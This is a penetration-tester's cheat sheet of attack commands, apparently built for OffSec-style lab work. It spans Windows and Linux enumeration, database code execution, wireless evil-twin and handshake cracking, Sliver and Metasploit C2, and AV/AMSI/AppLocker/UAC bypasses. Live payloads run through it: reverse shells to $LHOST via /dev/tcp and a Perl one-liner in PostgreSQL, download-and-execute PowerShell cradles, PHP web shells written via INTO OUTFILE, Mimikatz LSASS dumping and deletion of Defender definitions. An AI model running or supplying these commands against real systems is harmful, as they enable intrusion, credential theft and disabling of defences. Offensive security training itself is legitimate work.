=========================================utils=========================================
===Compile Binaries===
===exe file
i686-w64-mingw32-gcc tocompile.c -o output.exe -l[extra flags for winapi]
===dll file 
i686-w64-mingw32-gcc tocompile.c --shared -o output.dll -l[extra flags for winapi]
===so file with gcc
gcc -shared -fPIC -nostartfiles -o exp.so exp.c
gcc -Wall -fPIC -z execstack -shared -o libpsl.so.5 xor-libhijack.c
===compile without dependencies
gcc --static -o ...
===compile for other architectures
sudo apt-get install gcc-multilib -y
gcc smt.c -o smt -m32




===linux-binary-analysis
ldd `which curl` | grep libpsl
readelf -s --wide /usr/lib/x86_64-linux-gnu/libpsl.so.5 | grep FUNC | awk '$8 !~ /@GLIBC/ && $8 !~ /^_/' | awk '{print "int", $8 ";"}'

===b64-encoding===
===pwsh (utf-161e)
#bash-one-liner
echo -n 'text to encode "here"' | iconv -f UTF-8 -t UTF-16LE | base64 -w 0

#python3
python3 -c 'import base64; print(base64.b64encode('(New-Object System.Net.WebClient).DownloadString(\\'http://$LHOST/run.txt\\') | IEX'.encode('utf-16le')).decode())'

$text = '(New-Object System.Net.WebClient).DownloadString('http://$LHOST/run.txt') | IEX'
$bytes = [System.Text.Encoding]::Unicode.GetBytes($text)
$EncodedText = [Convert]::ToBase64String($bytes)
$EncodedText

===verify-cmd-execution===
tcpdump -i any -c5 icmp
===Check Network
netdiscover /r 0.0.0.0/24
===INTO OUTFILE D00R
SELECT “” into outfile “/var/www/WEROOT/backdoor.php”;
LFI?
===UPLOAD IMAGE
GIF89a1

===windows-utils===
===single-file-downloads
certutil.exe -urlcache -f http://$LHOST:8000/file outfile
powershell iwr -uri $LHOST:8000/file -OutFile out

===multi-files-downloads
$baseUrl = 'http://$LHOST/'
$fileNames = ('PowerUp.ps1', 'PowerView.ps1', 'mimikatz.exe')
$downloadPath = 'C:\Windows\Temp '
foreach ($fileName in $fileNames) 
{
	$url = $baseUrl + $fileName
	$filePath = Join-Path $downloadPath $fileName
	Invoke-WebRequest -uri $url -OutFi1e $filePath
	Write-Host 'Downloaded $fileName to $filePath'
}

===start non-interactive process===
Start-Process -NoNewWindow -FilePath C:\Windows\Temp\shell.exe

===fix-path===
set PATH=C:\Windows\system32;C:\Windows;C:\Windows\System32\Wbem;C:\Windows\System32\WindowsPowerShell\v1.0\;C:\Windows\System32\OpenSSH\;C:\Windows\system32\config\systemprofile\AppData\Local\Microsoft\WindowsApps

===set hidden file
C:> attrib +h hiddenfile.dll

===crack converters===
===shadow & passwd
unshadow passwd shadow > crack
===pdf
pdf2john file.pdf > crack
===ssh
ssh2john id_rsa > crack
===keepass
keepass2john database.kdbx > crack
===zip
zip2john file.zip > crack
===ansible
ansible2john ans.vault > crack (copy from $ANSIBLE_VAULT, remove all white space at front of new line)

===hashcat===
hashcat -m <hash-mode-id> <file-of-hashes> <wordlist> -r <ruleset> —force 
#NTLM:1000
#asreproasting:18200
#keberoasting:13100
#mscache: 2100 format: ($DCC2$10240#username#hash)
	hashcat -m2100 '\$DCC2\$10240#web_svc#130379745455ae62bbf41faa0572f6d3' ...
#ansible: 16900

===file-transfers===
===nc
#Receive
nc -l -p 53 > out.file
#Send
nc -w 3 $LHOST 53 < output.txt

===tunelling===
===SSH
ssh -N -L 0.0.0.0:8888:$RHOST:$RPORT username@remotehost
ssh -N -D 0.0.0.0:8888 username@tunnelhost
ssh -N -R 127.0.0.1:8888:$RHOST:$RPORT kali@kali-ip
ssh -N -R 8888 kali@kali-ip
===SSHUTTLE
sshuttle -r database_admin@192.168.238.63:2222 10.4.238.0/24 172.16.238.0/24

===ligolo
#Listener
sudo ip tuntap add user kali mode tun ligolo;sudo ip link set ligolo up;proxy -selfcert -laddr 0.0.0.0:443
#Agent
.\agent.exe -connect $LHOST:443 -ignore-cert
#Listener
sudo ip route add 172.16.201.0/24 dev ligolo

===msfconsole
# 1. Configure reverse tunnel 
msf5 exploit(multi/handler) > use multi/manage/autoroute
msf5 exploit(multi/handler) > set session 1 # already established shell session 
msf5 exploit(multi/handler) > exploit
msf5 post(multi/manage/autoroute) > use auxiliary/server/socks4a
msf5 auxiliary(server/socks4a) > set srvhost 127.0.0.1
msf5 auxiliary(server/socks4a) > exploit -j

# 2. force TCP through TOR or SOCKS Proxy
sudo bash -c 'echo 'socks4 127.0.0.1 1080' >> /etc/proxychains.conf' 
proxychains rdesktop $RHOST

===rustscan===
rustscan -a 192.168.103.0/24 --ulimit 5000

===nmap====
nmap -p- -sV -sC -V --open $TARGET 
nmap -p- -sT -sV -A $TARGET
nmap -p- --script=vuln $TARGET
===HTTP-Methods
nmap --script http-methods --script-args http-methods.url-path='/website' 
===  --script smb-enum-shares

===sed===
===ip
grep -oE '((1?[0-9][0-9]?|2[0-4][0-9]|25[0-5])\.){3}(1?[0-9][0-9]?|2[0-4][0-9]|25[0-5])' FILE
===port
#comma list
output | grep open | awk -F/ '{print $1}' ORS=','; echo
===replace
sed 's///g' file

===web-requests===
===curl
curl -X POST -F file=@/path/to/file http://target.com
#Post request with form values
curl -X POST -H 'Content-type:multipart/form-data' -F password='57416a3f482d92ce54d4570802ea807a' -F cmd='/bin/sh -i >& /dev/tcp/$LHOST/5000 0>&1' http://target.pg/wp-content/uploads/simple-file-list/7734.php

#file-upload
curl --data @/path/to/file

#https
curl -k https://

===wget
#Download 
wget http://target.pg/resource.txt [-o output.txt]
#Recursive download (only the current directory)
wget -r -np http://target.pg/resource/

===ssh===
private keys: id_rsa, id_ecdsa, id_ecdsa_sk, id_ed25519, id_ed25519_sk, id_dsa
===Writable authorized_keys
ssh-keygen
cat id_rsa.pub > authorized_keys #on target
ssh -i id_rsa -u username
===Readable id_rsa
chmod 0600 id_rsa
try ssh -i id_rsa

===ftp===
===ignore-prompts
ftp -i
===active-mode
ftp -A
===binary-encoding
ftp ...@target.com
binary

===snmp===
===snmpwalk
snmpwalk -v[1,2c,3] public target.pg
#Extended scan
snmpwalk -v2c -c public target.pg NET-SNMP-EXTEND-MIB::nsExtendObjects
#Query OID directly
snmpwalk -v2c -c public target.pg 1.3.6.1.4.1.8072.1.3.2.3.1.1
===snmp-check
snmp-check target.pg

===smb===
===smbclient
smbclient [-L] \\$TARGET\ -U user --password=pass
===impacket-smbclient
impacket-smbclient domain.com/username:password@target.com -target-ip target.com
recurse ON
prompt OFF
===enum4linux
enum4linux [-u user] [-p password] -a target.pg

===smtp===
smtp-user-enum -M VRFY -U /opt/SecLists/Usernames/xato-net-10-million-usernames.txt -t $IP
smtp-user-enum -M EXPN -U /opt/SecLists/Usernames/xato-net-10-million-usernames.txt -t $IP
smtp-user-enum -M RCPT -U /opt/SecLists/Usernames/xato-net-10-million-usernames.txt -t $IP
smtp-user-enum -M EXPN -U /opt/SecLists/Usernames/xato-net-10-million-usernames.txt -t $IP

===rdp===
===xfreerdp
xfreerdp /u:offsec /p:lab /v:$target /cert-ignore /dynamic-resolution
xfreerdp3 /u:offsec /p:lab /v:$target /cert:ignore /dynamic-resolution
#PTH
xfreerdp /u:admin /pth:2892D26CDF84D7A70E2EB3B9F05C425E /v:$target /cert-ignore

===rpc===
===rpcclient
rpcclient -N -U '' $TARGET
#enumerate users
rpcclient $> enumdomusers

===rsync===
#list shares/folder
rsync -av --list-only rsync://target.pg
#download
rsync -av rsync://target.pg/path/to/resource /destination/path
#upload
rysnc -av /resource/to/upload rsync://target.pg/destination/path

===postgresql===
psql -h target.com -p 3567 -U username
#list dbs 
psql> \l
#connect to db
psql> \c database
#Show full table
psql> Select * from table_name
#check user roles
\du+

===rce
#PoC
psql> CREATE TABLE cmd_exec(cmd_output text);
psql> COPY cmd_exec FROM PROGRAM 'id';
psql> SELECT * FROM cmd_exec;
psql> DROP TABLE IF EXISTS cmd_exec;
#Reverse shell
psql> COPY files FROM PROGRAM 'perl -MIO -e ''$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,'192.168.0.104:80');STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;''';

===mysql===
===connect
mysql -h target.pg -u root
===Exploiting
SELECT '<?php system($_GET['cmd']); ?>' into outfile 'Document/Root/shell.php'
===UDF PrivEsc
#link to dlls https://github.com/rapid7/metasploit-framework/tree/master/data/exploits/mysql
==Linux
#compile
gcc -g -c raptor_udf2.c
gcc -g -shared -Wl,-soname,raptor_udf2.so -o raptor_udf2.so raptor_udf2.o -lc
#mysql commands
use mysql;
create table npn(line blob);
insert into npn values(load_file('/tmp/raptor_udf2.so'));
show variables like '%plugin%';
select * from npn into dumpfile '/%plugin%/dir/raptor_udf2.so';
create function sys_exec returns integer soname 'raptor_udf2.so';
select sys_exec('chmod u+s /bin/bash');
==Windows
#reference: https://www.exploit-db.com/docs/english/44139-mysql-udf-exploitation.pdf
same as linux, use dll instead of so

===mssql===
===enumeration
setspn -T corp1 -Q MSSQLSvc/*
. .\GetUserSPNs.ps1
impacket-mssqlclient -port 1433 domain.com/username:password@target.com -window

#Show which logins allow impersonation
SELECT distinct b.name FROM sys.server_permissions a INNER JOIN sys.server_principals b ON a.grantor_principal_id = b.principal_id WHERE a.permission_name = 'IMPERSONATE'

===unc-injection
1. start smb server
sudo responder -I tun0
2. List smb share from target
EXEC xp_dirtree '\\$LHOST\kali'
#Using nxc 
nxc mssql dc01.corp1.com -u Offsec -p lab -q 'EXEC xp_dirtree '\\\\$LHOST\kali';'

#Clear responder's cached credentials
sudo rm /usr/share/responder/Responder.db

===relay-attack (SMB Signing must be disabled on target)
1. b64 Encode pwsh payload
python3 -c 'import base64; print(base64.b64encode('(New-Object System.Net.WebClient).DownloadString(\\'http://$LHOST/run.txt\\') | IEX'.encode('utf-16le')).decode())'

2. NtlmRelayx Listener
sudo impacket-ntlmrelayx --no-http-server -smb2support -t $LHOST -c 'powershell -enc <b64-payload>'

3. UNC Injection to force NTLM authentication + Hash Relay Authentication + command execution
xp_dirtree \\$LHOST\kali

===xp_cmdshell
1. EXECUTE AS LOGIN = 'sa';
2. EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;
3. EXEC xp_cmdshell whoami;

===ole-automation
1. EXECUTE AS LOGIN = 'sa';
2. EXEC sp_configure 'Ole Automation Procedures', 1; RECONFIGURE;
3. DECLARE @myshell INT; EXEC sp_oacreate 'wscript.shell', @myshell OUTPUT; EXEC sp_oamethod @myshell, 'run', null, 'cmd /c \'echo Test > C:\\Tools\\file.txt\'';

===create-assembly (Prepare managed DLL [Microsoft.SqlServer.Server.SqlProcedure])
1. use msdb; (or any TRUSTWORTHY db)
2. EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'clr enabled', 1; RECONFIGURE; EXEC sp_configure 'clr strict security', 0; RECONFIGURE;
3. CREATE ASSEMBLY [SqlAssembly] FROM 'C:\Tools\sqlasm.dll' WITH PERMISSION_SET = UNSAFE;
4. CREATE PROCEDURE [dbo].[cmdExec] @execCommand NVARCHAR(MAX) AS EXTERNAL NAME [SqlAssembly].[StoredProcedures].[cmdExec];
5. EXEC cmdExec 'whoami'

===linked-servers
#Enumerate linked servers
EXEC sp_linkedservers;

#Remote qeury on linked servers
select version from openquery('dc01', 'select @@version as version');

#Remote xp_cmdshell
EXEC ('sp_configure ''show advanced options'', 1; reconfigure;') AT DC01
EXEC ('sp_configure ''xp_cmdshell'', 1; reconfigure;') AT DC01
EXEC ('xp_cmdshell whoami;') AT DC01

#Return querying & execution
EXEC ('sp_linkedservers') AT DC01
select mylogin from openquery('dc01', 'select mylogin from openquery('appsrv01', ''select SYSTEM_USER as mylogin'')')
EXEC ('EXEC (''sp_configure ''''show advanced options'''', 1; reconfigure;'') AT appsrv01') AT dc01

===webdav===
wsgidav --host=0.0.0.0 --port=80 --auth=anonymous --root /home/kali/xxx/webdav/

===git===
git status
git log
git show <comit-id>

===add user and email
git config --global user.email 'kali@kali.com'
git config --global user.name 'kali'

===swaks===
#sudo swaks -t <recipient1>@<domain> -t <recipient2>@<domain> --from <sender>@<domain> -ap --attach @beyond.Library-ms --server mail.com --body body.txt --header 'Subject: sugondese' --suppress-data
#Add an '@' infront of attachment file name if its not being sent through email
#Can verify that file is attached & sent if swaks outputs something like
		#-> Content-Type: application/octet-stream; name='config.Library-ms'
		# -> Content-Description: config.Library-ms
		# -> Content-Disposition: attachment; filename='config.Library-ms'
		# -> Content-Transfer-Encoding: BASE64
sudo swaks -t jim@relia.com --from maildmz@relia.com --attach @config.Library-ms --server 192.168.236.189 --body body.txt --header 'Subject: Staging Script' -ap

==================================wireless==================================
===Put in monitor mode
sudo airmon-ng start wlan0

===Enumeration
#Show available APs
sudo airodump-ng wlan0mon --manufacturer --wps --band abg
	--manufacturer: resolve MAC OUI to vendor name
	--wps: detects WPS support on AP
	--band: expands scanning to include 2.4 & 5 GHz
	-w ~/outfile: write capture files

#Show client connected to particular AP
sudo airodump-ng wlan0mon --manufacturer --wps --band abg --channel <target channel> --bssid <AP bssid>
	-> output will show bssid (connected AP) and station (Client's MAC)

===Bruteforcing ESSID (wifi name)
#Put interface in same channel as target 
iwconfig wlan0mon channel <target channel>
#Bruteforce
mdk4 wlan0mon p -t <target bssid> -f ./wifi.txt 

===Mac spoofing
systemctl stop network-manager
ip link set wlan2 down
macchanger -m <target mac> wlan2
ip link set wlan2 up

===WEP Attack
# Start airodump on target AP (concurrently)
sudo airodump-ng -bssid <BSSID> -c <Channel> -w ./wep wlan0mon

# Create fake authentication request on AP (concurrently)
sudo aireplay-ng -1 3600 -q 10 -a <BSSID> wlan0mon

# Generate traffic for IV (concurrently)
sudo aireplay-ng -3 -b <BSSID> -h <Client MAC> wlan0mon

# Crack key (concurrently)
sudo aircrack-ng <output_file>.cap
	-> output sample: KEY FOUND! [ 11:BB:33:CD:55 ]

===WPA/WPA2 Attack

# Start airodump on target AP (concurrently)
sudo airodump-ng -bssid <BSSID> -c <Channel> -w ./wep wlan0mon

# Deauthenticate target client (concurrently)
sudo aireplay-ng -a <BSSID> -c <Client Mac> -0 10 wlan0mon

# Crack captured handshake in .cap file


===WPA/WPA2 AP-Less Attack (Evil twin)

# Scan & find client probes
sudo airodump-ng wlan0mon -w <output_file>

# Create AP based on observed client probes <etwin.conf>
```
# Interface used for the AP
interface=wlan1

# Use 2.4GHz band (b/g/n)
hw_mode=g

# Channel number
channel=1

# Linux driver type
driver=nl80211

# Network name (SSID)
ssid=wifi_offices

# Authentication algorithms (1 = WPA, 2 = WPA2, 3 = both)
auth_algs=1

# Enable WPA2
wpa=2

# Key management protocol
wpa_key_mgmt=WPA-PSK

# WPA passphrase (8–63 characters)
wpa_passphrase=abc123123

```

# Start Evil twin
hostapd -d etwin.conf -> handshake captured in airodump

# Crack captured handshake

===Cracking captured handshake
#Aircrack
sudo aircrack-ng <output_file>.cap -e <ESSID>

#Hashcat
hcxpcapngtool -o <output_file>.hc22000 <output_file>.cap
hashcat -m 22000 <output_file>.hc22000 -w /usr/share/john/password.lst


===Connecting to AP
# Open config
	network=
	{
		ssid='$ESSID'
		key_mgmt=NONE
		scan_ssid=1
	}

# WEP Config
        network=
	{
           ssid='hotel_wifi'
           key_mgmt=NONE
           wep_key0=key_no_colons
           wep_tx_keyidx=0
        }

# WPA/2 Config
        network=
	{
         	ssid='hotel_wifi'
         	key_mgmt=WPA-PSK
         	psk='hotel_password'
         	priority=100
		bssid=<MAC Address>
        }

# WPA2-Enterprise Config
	network=
	{
            ssid='NetworkName'
            scan_ssid=1
            key_mgmt=WPA-EAP
            identity='Domain\username'
            password='password'
            eap=PEAP
            phase1='peaplabel=0'
            phase2='auth=MSCHAPV2'
          }

# Connect & Lease IP
wpa_supplicant -D nl80211 -i wlan2 -c free.conf
dhclient wlan2 -v
	Dont use same interface as monitor mode int

==================================web==================================
==url-enumeration===
===directories
gobuster dir -w /wls/SecLists/Discovery/Web-Content/directory-list-2.3-big.txt -u $URL -x txt,js,html,php 
wfuzz -c -z file,/wls/SecLists/Discovery/Web-Content/raft-large-directories.txt --hc 404 '$URL'
ffuf -w /wls/SecLists/Discovery/Web-Content/quickhits.txt -u $URL -fw 20
===authenticated
wfuzz -c -z file,/wls/SecLists/Discovery/Web-Content/raft-medium-directories.txt --hc 404 -d 'SESSIONID=value' '$URL'
===files
gobuster dir -u $URL -w /wls/SecLists/Discovery/Web-Content/raft-medium-files.txt -l -k -t 30
wfuzz -c -z file,/opt/SecLists/Discovery/Web-Content/raft-large-files.txt --hc 404 '$URL'
===parameters
wfuzz -c -z file,/wls/SecLists/Discovery/Web-Content/burp-parameter-names.txt '$URL'su
===subdomain
ffuf -w /wls/subdomain-10000.txt -u http://target.pg -H 'Host:FUZZ.target.pg'
gobuster dns -d domain.org -w /wls/SecLists/Discovery/DNS/subdomains-top1million-110000.txt -t 30
===custom-wordlist
cewl $URL -m [min word length] -w wordlist.txt
cewl --lowercase $URL -w wordlist
===nikto
nikto -h $TARGET -o output.file 
nikto -h $TARGET -p 80, 8080, 1234
nikto -h $TARGET -Tuning 123dbe
nikto --host $IP -ssl -evasion 1

===hydra===
-I : ignore any restore files
-f : stop when a login is found
C=/ tells hydra to establish session cookies at this URL
F=403 tells hydra that HTTP 403 means invalid login

hydra ... 'http-post-form://...:username=...:C=/:F=403'
hydra ... 'http-post-form://...:username=...:C=/:F=error-pattern'

===HTTP basic auth
hydra -I -f -L [userlist] -P [passlist] -V -s 80 -f $TARGET http-get /url_path/ -t 15

===HTTP GET
hydra -I -f -l [user] -V -P [passlist] 'http-get-form://target.pg:8080/path/to/service:username=^USER^&password=^PASS^:Incorrect-Pattern'

===HTTP POST
hydra -I -f -l [user] -V -P [passlist] 'http-post-form://target.pg:8080/path/to/service:username=^USER^&password=^PASS^:Incorrect-Pattern'

===Hydra BASE64-encoding
hydra -I -f -L ~/pentest/billyboss/wordlist -V -P ~/pentest/billyboss/wordlist 'http-post-form://target.pg:8081/service/rapture/session:username=^USER64^&password=^PASS64^:Incorrect'

===php===
===PHP Parameter Fuzzing
ffuf -w /wls/lfiparam -u $URL?FUZZ=php://filter/convert.base64-encode/resource=xxx.php

===PHP Filter Checks.
php://filter/convert.base64-encode/resource=

===LFI fuzzing lists
SecLists/Fuzzing/LFI/LFI-gracefulsecurity-linux.txt
SecLists/Fuzzing/LFI/LFI-gracefulsecurity-windows.txt
SecLists/Fuzzing/LFI/LFI-LFISuite-pathtotest-huge.txt

===XSS Fuzzing===
wfuzz -c -z file,/wls/SecLists/Fuzzing/XSS/XSS-BruteLogic.txt '$URL'
wfuzz -c -z file,/wls/SecLists/Fuzzing/XSS/XSS-Jhaddix.txt '$URL'

===Command Injection===
===POST data
wfuzz -c -z file,/wls/SecLists/Fuzzing/command-injection-commix.txt -d 'doi=FUZZ' '$URL'

===Commix
commix --url='https://supermegaleetultradomain.com?parameter=' --level=3 --force-ssl --skip-waf --random-agent

===sqli===
===Manual
---Query balancing ORDER BY
user=1 ORDER BY [x]; until error
--- Find rendered results in page 
UNION SELECT 1,2...x; which number changed within the page?
		UNION SELECT not executing? -> Try making preceding statement FALSE
--- Find DB Name
UNION SELECT 1, database(), 3, 4..., x
--- Find all tables
UNION SELECT 1, group_concat(table_name),3,...x FROM information_schema.TABLES WHERE table_schema='[db_name]'
-- Find all column in a table
UNION SELECT 1, group_concat(column_name),3,...x FROM information_schema.COLUMNS WHERE table_name='[table_name]'
-- Enumerate values of a row in a column
UNION SELECT 1, group_concat(column1, column2),3,...x FROM '[table_name]'
#Blind SQL
' AND IF (1=1, sleep(3), 'false'); -- 
' UNION SELECT IF(1=1, SLEEP(5), null);-- -
===SQLMAP
sqlmap -u $URL --threads=2 --time-sec=10 --level=2 --risk=2 --technique=T --force-ssl
sqlmap -u $URL --threads=2 --time-sec=10 --level=4 --risk=3 --dump
/SecLists/Fuzzing/alphanum-case.txt

===MYSQL xp_cmdshell
EXECUTE sp_configure 'show advanced options',1;
RECONFIGURE;
EXECUTE sp_configure 'xp_cmdshell',1;
RECONFIGURE;
EXECUTE xp_cmdshell 'powershell -e JAB..oACkA';

===wordpress===
wpscan -update
wpscan -e --url $URL
===Brute force user(s)
wpscan --url $URL -P [path/to/wordlist] -U [path/to/wordlist]
===enumerate example
wpscan --url [url] --enumerate [p/vp/ap/t/vt/at] --plugins-detection aggressive
===scan all plugins
wpscan --url [url] --enumerate ap --plugins-detection aggressive
===Scanning with Api Tokens 
wpscan --url https://brainfuck.htb --api-token [token]
===Disable-tls-checks 
wpscan --url https://brainfuck.htb --disable-tls-checks --api-token [token]
===Panel RCE
#Appearance editor
Edit Appearance → Theme Editor → 404 Template
/wp-content/themes/twentytwelve/404.php

#Plugin upload
Plugins > add new > add php web shell > install now
/wp-content/uploads/YYYY/MM/shell.php

#Upload & activate malicious plugin
Get zip file of plugin online
Dashboard > Plugins > Upload Plugin > Activate plugin on dashboard
Use known exploit

===Drupal===
droopescan scan -u http://$TARGET

===Joomla===
joomscan -u http://$TARGET
./joomlavs.rb --url http://$TARGET -a -v

===Tomcat===
===Brute Force===
hydra -L <USERS_LIST> -P <PASSWORDS_LIST> -f <IP> http-get /manager/html -vV -u

===WebDav===
===davtest
davtest -url http://$TARGET
#Upload .txt files and try to move it to other extensions
davtest [-auth user:password] -move -sendbd auto -url $URL
davtest [-auth user:password] -sendbd auto -url $URL ===Try to upload every extension
===cadaver
cadaver $TARGET #-> supply creds
#upload
put file
#download
get file

====================================C2============================================
===sliver===
===generate-payload
sliver > generate --mtls $LHOST --os windows --arch amd64 --format exe --save /var/www/html

===listener
#Start listener
sliver > mtls #wait for connection --lport 81
#Attach to session
sliver > use
#Start shell
sliver (INTERACTIVE) > shell

===staged-listener
sliver > profiles new --mtls $LHOST:8889 --format shellcode win64
sliver > stage-listener --url tcp://$LHOST:8888 --profile win64
sliver > mtls -L $LHOST --lport 8889
#create payload with LPORT=8888, hit stage-listener 1st, mtls listener 2nd

===sliver-mimikatz
sliver (INTERACTIVE) > upload /serve/basic/mimidrv.sys c:\\windows\\temp\\
sliver (INTERACTIVE) > mimikatz "\"privilege::debug\" \"token::elevate\" \"!+\" \"!processprotect /process:lsass.exe /remove\" \"log mmk.log\" \"sekurlsa::logonpasswords\""

===impersonateuser
impersonate DOMAIN\\user
#revert to self
rev2self

===sliver-utils
#dumphash
hashdump

sharp-hound-4 -- '-c all,GPOLocalGroup'

===process-listing
ps -e <process-name>
ps -o <owner-name> ; ps -o <domain>

===execution
execute notepad
execute-shellcode /serve/basic/ps64rev.bin -p <pid-migrate>

===powershell-execution
sharpsh -- '-u http://$LHOST/basic/pv.ps1 -c Get-DomainGroup \"Domain Admins\""'
# B64Encoded Get-DomainGroup "Domain Admins"
sharpsh -- '-u http://$LHOST/basic/pv.ps1 -e -c RwBlAHQALQBEAG8AbQBhAGkAbgBHAHIAbwB1AHAAIAAiAEQAbwBtAGEAaQBuACAAQQBkAG0AaQBuAHMAIgA='

===donut===
donut -i /serve/ps64.exe -a 2 -b 2 -o /serve/basic/ps64rev.bin -p '-c c:\\windows\\temp\\rev.exe'

===msfconsole===
#Meterpreter staged
msfconsole -q -x 'use exploit/multi/handler; set PAYLOAD windows/x64/meterpreter/reverse_tcp; set LHOST $LHOST; set LPORT 81; set AutoRunScript migrate -n explorer.exe; exploit'

===msfvenom===
===Basic usage
msfvenom -p <payload/type> LHOST=$LHOST LPORT=8888 -f <format> -o <outfile>
===Listing
msfvenom --list encrypt / encode
===Shellcode
msfvenom -p windows/meterpreter/reverse_tcp LHOST=$LHOST LPORT=8888 -f python -b '<\xBad\xBytes\xTo\xIgnore>' -v shellcode
#Meterpreter
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=$LHOST LPORT=8888 -f csharp -v shellcode

===examples
msfvenom -p windows/x64/shell_reverse_tcp LHOST=$LHOST LPORT=8888 -f exe -o reverse.exe
#powershell64
msfvenom -p windows/x64/shell_reverse_tcp LHOST=$LHOST LPORT=8888 -f psh-cmd -> #copy behind `-e`
#Encoding
msfvenom -p windows/meterpreter/reverse_https LHOST=$LHOST LPORT=8888 e x86/shikata_ga_nai -f exe -o met.exe
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=$LHOST LPORT=8888 -e x64/zutto_dekiru -f exe -o reverse.exe

#Templates
-x /home/kali/notepad.exe

#ascii-encoding
msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=`me` LPORT=8888 -f raw -v mjolnir 2>/dev/null | od -An -t u1 | tr -s ' ' '\n' | grep -v '^$' | paste -sd',' -

#xor-encryption
msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=$LHOST LPORT=8888 -f csharp --encrypt xor --encrypt-key iLadies -v mjolnir 2>/dev/null

#caesar-ecoding
##raw
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=$LHOST LPORT=81 -f raw 2>/dev/null | caexor --key 2 -f raw -v mjolnir

##vba
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=$LHOST LPORT=81 -f vbapplication 2>/dev/null | caexor --key 2 -f vba -v mjolnir


#AlwaysInstallElevated msi
msfvenom -p windows/x64/shell_reverse_tcp LHOST=$LHOST LPORT=80 -a x64 --platform Windows -f msi -o evil.msi



=========================================av-evasion==============================================
===av-enumeration===

===WinDefend
Get-MpComputerStatus | findstr IoavProtectionEnabled

===amsi
Get-Process -Module | Where-Object {$_.ModuleName -match "amsi"}
Enter bad strings to trigger flagging "AmsiUtils"

===LSA-PPL
Get-ItemProperty -Path HKLM:\SYSTEM\CurrentControlSet\Control\Lsa -Name 'RunAsPPL'

===AppLocker
Get-Service AppIDSvc
Get-ChildItem -Path HKLM:\SOFTWARE\Policies\Microsoft\Windows\SrpV2\Exe

#EventViewer
Event Viewer -> Applications and Services Logs -> Microsoft -> Windows -> AppLocker

#gpedit.msc
Local Computer Policy -> Computer Configuration -> Windows Settings -> Security Settings -> Application Control Policies -> AppLocker

===powershell-constrained-language (clm)
$ExecutionContext.SessionState.LanguageMode

===evasion===
===disable-av
"C:\Program Files\Windows Defender\MpCmdRun.exe" -RemoveDefinitions -All


===in-memory-iex
(New-Object System.Net.WebClient).DownloadString('http://$LHOST/payload.txt') | IEX

===amsi
(new-object system.net.webclient).downloadstring('http://$LHOST/amsibypass.ps1') | IEX

===bypass-lsa-ppl
mimikatz # !+
mimikatz # !processprotect /process:lsass.exe /remove

===in-mem-mimikatz
(New-Object System.Net.WebClient).DownloadString('http://$LHOST/basic/amsibypass.txt') | IEX

(New-Object System.Net.WebClient).DownloadString('http://$LHOST/basic/invmmk.txt') | IEX; Invoke-Mimikatz -Command "`"privilege::debug`" `"token::elevate`" `"!+`" `"!processprotect /process:lsass.exe /remove`" `"log mmk.log`" `"sekurlsa::logonpasswords`""

===AppLocker
#rundll in trusted location
rundll32.exe C:\Windows\Tasks\TestDll.dll,run
#alternate-data-stream ads
type test.js > "C:\Program Files (x86)\TeamViewer\TeamViewer12_Logfile.log:test.js"
dir /r "C:\Program Files (x86)\TeamViewer\TeamViewer12_Logfile.log"
wscript "C:\Program Files (x86)\TeamViewer\TeamViewer12_Logfile.log:test.js"

===installutil
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\installutil.exe /logfile= /LogToConsole=false /U C:\users\student\CLMBypass.exe
certutil -encode CLMBypass.exe file.txt
bitsadmin /Transfer myJob http://$LHOST/file.txt C:\users\student\enc.txt
certutil -decode C:\users\student\enc.txt C:\users\student\CLMBypass.exe
del C:\users\student\enc.txt

===xml-execution
#Microsoft.Workflow.Compiler#
1# transfer RedTeamPayloads\AppLockerBypass\wfc-payload.cs to target
2# run RedTeamPayloads\AppLockerBypass\MsWorkflowCompilerXML.ps1 to generate xml
3# C:\Windows\Microsoft.Net\Framework64\v4.0.30319\Microsoft.Workflow.Compiler.exe msworkflowcomp.xml any.xml

#msbuild#
#use RedTeamPayloads\AppLockerBypass\MSBuild.xml (already embedded with c# code)
C:\Windows\Microsoft.NET\Framework64\v4.0.303.19\MSBuild.exe c:\windows\temp\MSBuild.xml

===mshta-hta-execution
c:\windows\system32\mshta.exe rev.hta
c:\windows\system32\mshta.exe http://$LHOST/rev.hta

===xsl-execution
cmd /c 'wmic process get brief /format:"http://$LHOST/payload.xsl"'

===kaspersky-linux
sudo kesl-control --stop-t 1
sudo kesl-control --start-t 1
sudo kesl-control --scan-file ./file
sudo kesl-control -E --query | grep DetectName


===fodhelper-uac
New-Item -Path HKCU:\Software\Classes\ms-settings\shell\open\command -Value "powershell.exe (New-Object System.Net.WebClient).DownloadString('http://$LHOST/run.txt') | IEX" -Force

New-ItemProperty -Path HKCU:\Software\Classes\ms-settings\shell\open\command -Name DelegateExecute -PropertyType String -Force
C:\Windows\System32\fodhelper.exe


===utils===
===dll-proxying
#export-forwarder-creation
python perfect_dll_proxy.py secur32.dll -> generates import list template

===dll-to-jscript dotnettojscript
DotNetToJScript.exe ExampleAssembly.dll --lang=Jscript --ver=v4 -o runner.js


================================linux=====================================
===system enumeration===
#System versions
uname -a
lsb_release -a
cat /proc/version
cat /etc/issue
cat /etc/os-release

#Environment vars
env

#Check history
history

#Networking info
netstat -ntplu
ss -ntplu
ss -anp
routl

#Find SUID binaries
find / -type f -perm -04000 -ls 2>/dev/null
find / -perm -u=s -type f 2>/dev/null

#Finding stuff
find / -type <[d/f]> -name <'pattern*'> 
find / -writable -type [d/f] 

#Check perms
sudo -l

===Shadow & Passwd===
ls -l /etc/shadow
===crack shadow
unshadow passwd shadow > crackthis
john --wordlist=/wls/rockyou.txt crackthis

#Capabilities
getcap -r / 2>/dev/null

#List cron jobs
cat /etc/crontab #-> CHECK THE PATH variable in the cron file!!
ls -lah /etc/cron*
crontab -l

#Observe service footprints
pspy64
watch -n 1 'ps -aux | grep pass'
sudo tcpdump -i lo -A | grep 'pass'

#Check paths
echo $PATH

===check NFS===
cat /etc/exports -> check for no_root_squash

